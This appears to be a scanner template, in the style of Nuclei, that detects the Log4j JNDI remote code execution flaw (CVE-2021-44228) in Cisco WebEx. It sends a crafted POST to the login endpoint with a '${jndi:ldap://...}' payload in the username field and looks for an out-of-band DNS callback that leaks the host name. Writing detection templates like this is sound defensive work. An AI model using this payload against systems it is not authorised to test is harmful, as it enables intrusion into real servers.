id: cisco-webex-log4j-rce
brief:
    title: Cisco WebEx - Remote Code Execution (Apache Log4j)
    by: shaikhyaser
    level: critical
    about: Cisco WebEx is susceptible to Log4j JNDI remote code execution. Cisco WebEx provides web conferencing, videoconferencing and contact center as a service applications.
    label:
        - cve
        - cve2021
        - rce
        - jndi
        - log4j
        - cisco
        - webex
        - oast
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/orion/login?siteurl=meet'
      head:
        Content-Type: application/x-www-form-urlencoded
        Origin: '{{RootURL}}'
        Referer: '{{RootURL}}/orion/login?siteurl=meet&rnd=0.1359184728177283'
        X-Requested-With: XMLHttpRequest
      body: type=getFailureTimes&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&bAjax=true
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
